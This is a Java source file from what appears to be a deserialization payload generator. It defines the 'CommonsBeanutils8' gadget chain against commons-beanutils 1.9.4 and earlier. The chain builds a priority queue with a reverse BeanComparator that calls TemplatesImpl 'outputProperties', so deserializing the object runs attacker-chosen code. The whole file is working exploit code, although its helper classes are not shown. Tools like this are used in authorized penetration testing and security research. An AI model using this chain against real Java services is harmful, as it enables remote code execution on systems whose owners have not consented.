package com.ppp.chain.commonsbeanutils;

import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;

import java.util.Comparator;

/**
 * @author Whoopsunix
 * <p>
 * CommonsBeanutilsReverseComparatorJDK
 */
@Dependencies({"commons-beanutils:commons-beanutils:<=1.9.4"})
@Authors({Authors.Whoopsunix})
@Sink({Sink.TemplatesImpl})
public class CommonsBeanutils8 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(CommonsBeanutils8.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject, sinksHelper.getCbVersion());

        return kickOffObject;
    }

    public Object getChain(Object templates, CBVersionEnum version) throws Exception {
        Comparator comparator = BeanComparatorBuilder.scheduler(BeanComparatorBuilder.CompareEnum.ReverseComparator, version);
        return BeanComparatorBuilder.queueGadgetMaker(comparator, templates, RanDomUtils.generateRandomString(1), "outputProperties");
    }
}
